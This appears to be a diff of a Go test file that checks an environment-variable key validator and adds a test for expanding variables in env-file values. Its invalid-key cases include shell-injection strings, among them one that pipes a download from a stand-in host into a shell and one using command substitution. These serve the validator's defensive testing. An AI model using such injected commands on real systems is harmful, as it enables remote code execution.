@@ -14,13 +14,13 @@ func TestIsValidKey(t *testing.T) {
 		{"_under", true},
 		{"a1b2", true},
 		{"", false},
-		{"1FOO", false},                        // can't start with digit
-		{"FOO BAR", false},                     // space
-		{"FOO-BAR", false},                     // hyphen
-		{"EVIL;curl evil.example|sh;X", false}, // shell-injection payload
-		{"EVIL$(id)X", false},                  // command substitution
-		{"EVIL\nINJECT=ok", false},             // newline
-		{"EVIL=ok", false},                     // equals
+		{"1FOO", false},
+		{"FOO BAR", false},
+		{"FOO-BAR", false},
+		{"EVIL;curl evil.example|sh;X", false},
+		{"EVIL$(id)X", false},
+		{"EVIL\nINJECT=ok", false},
+		{"EVIL=ok", false},
 	}
 	for _, c := range cases {
 		if got := IsValidKey(c.in); got != c.want {
@@ -110,5 +110,14 @@ func TestParseEnvBytes(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+func TestExpandClientEnvBytesExpandsValuesOnly(t *testing.T) {
+	t.Setenv("DS_TEST_DIR", `C:\Vaults`)
+	in := "A=keepass($DS_TEST_DIR\\db.kdbx|entry)\n# $DS_TEST_DIR\nNOEQUALS $DS_TEST_DIR\nB=plain"
+	want := "A=keepass(C:\\Vaults\\db.kdbx|entry)\n# $DS_TEST_DIR\nNOEQUALS $DS_TEST_DIR\nB=plain"
+	if got := string(ExpandClientEnvBytes([]byte(in))); got != want {
+		t.Errorf("got %q, want %q", got, want)
 	}
 }
